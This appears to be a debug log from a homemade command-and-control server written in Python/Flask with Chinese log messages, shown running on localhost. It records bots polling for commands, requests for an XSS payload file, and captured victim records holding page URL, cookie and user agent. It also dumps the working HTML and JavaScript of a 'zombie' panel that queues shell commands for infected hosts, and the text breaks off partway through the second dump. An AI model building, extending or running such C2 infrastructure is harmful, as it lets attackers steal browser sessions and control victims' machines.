2025-06-25 11:30:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:30:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:30:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:30:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:30:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:30:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:30:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:30:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:30:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:30:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:30:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 13:19:59 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 13:19:59 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 13:19:59 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 13:19:59 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 13:19:59 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 13:19:59 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 13:19:59 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 13:19:59 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 13:19:59 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-25 13:20:03 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-25 13:20:03 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-25 13:20:03 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 13:20:03 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 13:20:03 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-25 13:20:03 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-25 13:20:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 13:20:04 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 13:20:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 1988 bytes [200 OK]>
2025-06-25 13:20:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 13:20:04] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 13:20:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 13:20:06 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 13:20:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 1988 bytes [200 OK]>
2025-06-25 13:20:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 13:20:06] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 13:20:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 13:20:07 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 13:20:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 1988 bytes [200 OK]>
2025-06-25 13:20:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 13:20:07] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 13:20:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 13:20:35 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 13:20:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 2461 bytes [200 OK]>
2025-06-25 13:20:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 13:20:35] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 13:20:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 13:20:35 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 13:20:35 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-25T05:20:35.375Z"}', None, '2025-06-25 13:20:35.379048', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 13:20:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0312s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 13:20:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 13:20:35] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 13:20:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 13:20:35 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 13:20:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0118s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 13:20:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 13:20:35] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 13:20:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 13:20:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 13:20:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 13:20:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 13:20:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 13:20:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 13:20:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 13:20:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 13:20:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 13:20:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 21:09:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 21:09:30 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 21:09:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0012s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        